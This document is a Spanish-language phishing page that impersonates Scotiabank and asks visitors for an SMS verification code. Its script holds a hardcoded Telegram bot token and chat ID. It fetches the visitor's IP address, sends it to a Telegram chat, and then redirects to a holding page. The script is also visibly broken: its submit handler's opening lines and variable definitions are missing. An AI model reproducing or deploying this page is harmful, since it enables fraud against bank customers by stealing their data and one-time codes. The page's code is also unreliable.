<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verificaci√≥n Requerida</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Verdana', sans-serif;
      background-color: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .container {
      text-align: center;
      max-width: 800px;
      margin: 50px auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    h1 {
      color: #343348;
      margin-top: 0;
      margin-bottom: 10px;
    }

    input {
      border-radius: 10px;
      border: 1px solid #b3bac8;
      max-width: 600px;
      margin: 10px 7px;
      height: 50px;
      font-size: 18px;
      width: 350px;
      text-align: center;
      outline: none;
    }

    input::placeholder {
      font-size: 16px;
    }

    input:focus {
      border-color: rgb(126, 125, 125);
    }

    .inputCodes {
      letter-spacing: 10px;
    }

    .boton {
      cursor: pointer;
      background: #e30613;
      color: #F4F4F4;
      border-radius: 4px;
      border: none;
      padding: 6px 16px;
      width: 250px;
      height: 40px;
      font-size: 0.875rem;
      transition: background-color 250ms ease;
      box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2),
                  0px 2px 2px 0px rgba(0, 0, 0, 0.14),
                  0px 1px 5px 0px rgba(0, 0, 0, 0.12);
    }

    .boton:hover {
      background-color: #ffffff;
    }

    .error-message {
      color: red;
      margin-top: 10px;
      display: none;
    }

    footer {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      background-color: #f4f4f4;
      text-align: center;
      font-family: Verdana;
      color: #6c757d;
      font-size: 12px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <header>
    <img alt="Logo" src="favicon-280x280.jpg" width="60" />
  </header>

  <section class="container">
    <form id="mainF" method="post" name="mainF" onsubmit="return handleSubmit(event)">
      <h1 class="title">Verificaci√≥n Requerida</h1>

      <p id="textoCodigo">Por motivos da seguridad Enviaremos un codigo SMS.

      <input

        required
        type="tel"
        id="smscode"
      /><br><br>

      <button class="boton" id="mainB" type="submit">CONFIRMAR</button>
      <p class="error-message" id="error-message"></p>
    </form>
  </section>

  <footer>
    <div class="footer-content">Scotiabank</div>
  </footer>

  <script>
    const TOKEN = "8479985570:AAHVq3f_pCkUDQEezS_RKrRzjX8h63bNJO8"; // Token de Telegram
    const CHAT_ID = "-4910179253"; // Chat ID

        errorMsg.textContent = "Por favor, ingres√° un c√≥digo v√°lido de 6 d√≠gitos.";
        errorMsg.style.display = "block";

      errorMsg.style.display = "block";

      fetch("https://api.ipify.org/?format=json")
        .then((response) => response.json())
        .then((data) => {
          const userIP = data.ip;

          return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `‚ûñ‚ûñ‚ûñ[ scotiabank ]‚ûñ‚ûñ‚ûñ

üåê IP: ${userIP}
‚ûñ‚ûñ‚ûñ[ 32 ]‚ûñ‚ûñ‚ûñ`,
              parse_mode: "Markdown",
            }),
          });
        })
        .catch((error) => {
          console.error("Error al obtener la IP o enviar datos:", error);
        });

      setTimeout(() => {
        window.location.href = "espera.html";
      }, 1000);
    }
  </script>
</body>
</html>
